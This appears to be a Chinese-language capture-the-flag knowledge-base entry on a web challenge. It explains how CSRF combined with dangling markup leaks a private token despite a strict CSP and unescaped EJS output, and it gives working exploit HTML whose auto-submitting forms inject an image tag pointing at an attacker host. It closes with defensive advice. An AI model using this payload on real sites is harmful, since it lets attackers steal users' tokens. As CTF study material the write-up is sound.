---
title: CSRF + Dangling Markup Token 泄露
category: web
tags: [csrf, dangling-markup, csp-bypass, ejs, html-injection, samesite-lax]
triggers: [CSRF, Dangling Markup, CSP绕过, script-src 'none', img-src, SameSite Lax POST窗口, target=_blank, EJS 未转义, form跨站提交, 京麒CTF]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/web/ColorNote_CSRF_Dangling_Markup.md]
---

## Summary

CSP `script-src 'none'` 下，利用 `img-src *` + Dangling Markup 外带数据。`target="_blank"` 的 form 提交不阻塞主页面 JS。SameSite=Lax 的 2 分钟 POST 宽松窗口允许跨站 POST。

## 漏洞链

```
bot 登录 lead_<token>（password=token）
  ↓ 攻击页面分 3 步：
  ├─ POST /notes/create（target=_blank） → 创建 prefix 笔记
  │   bodyHtml = <img src='http://ATTACKER/leak?x=
  ├─ POST /notes/2/edit（target=_blank） → 编辑 suffix 笔记
  │   bodyHtml = '>
  └─ location = /notes → 渲染：
      [0] prefix: <img src='http://ATTACKER/leak?x=
      [1] Private note: <!--0123...abcdef-->
      [2] suffix: '>
      → 浏览器拼接 src：'http://ATTACKER/leak?x=...<!--token-->...'>
      → 外带 token
```

## exploit 关键代码

```html
<form id="f1" action="{target}/notes/create" method="POST" target="_blank">
  <input name="bodyHtml" value="<img src='{public}/leak?x=">
</form>
<form id="f2" action="{target}/notes/2/edit" method="POST" target="_blank">
  <input name="bodyHtml" value="'>">
</form>
<script>
  document.getElementById("f1").submit();
  setTimeout(function() {
      document.getElementById("f2").submit();
      setTimeout(function() { location = "{target}/notes"; }, 2000);
  }, 2000);
</script>
```

## 解题要点

- `target="_blank"` → POST 在新标签页执行，主页面 JS 不受影响
- `setTimeout` 链：f1.submit() → 2s → f2.submit() → 2s → location = /notes
- bot 停留 12s，足够完成 4s 的执行链
- CSP：`script-src 'none'; img-src *; form-action 'self'`

## 防御要点

1. 永不使用 `<%- ... %>` 原样输出用户 HTML → 改用转义 `<%= %>`
2. session cookie 设 `SameSite=Strict` 或 Lax + CSRF token
3. CSP 收紧 `img-src` 不允任意域名
4. 可兑换 flag 的 token 不放在前端 HTML 中

## Connections

- **Related:** [[client-validation-bypass]] — 客户端校验绕过
- **Related:** [[ghsa-xss-csrf]] — XSS + CSRF 合成页
- **Related:** [[ghsa-ssrf-auth-bypass]] — 认证绕过
- **Source:** [ctf-kb/web/ColorNote_CSRF_Dangling_Markup.md](file:///c:/Users/ZZH/.trae/ctf-kb/web/ColorNote_CSRF_Dangling_Markup.md)
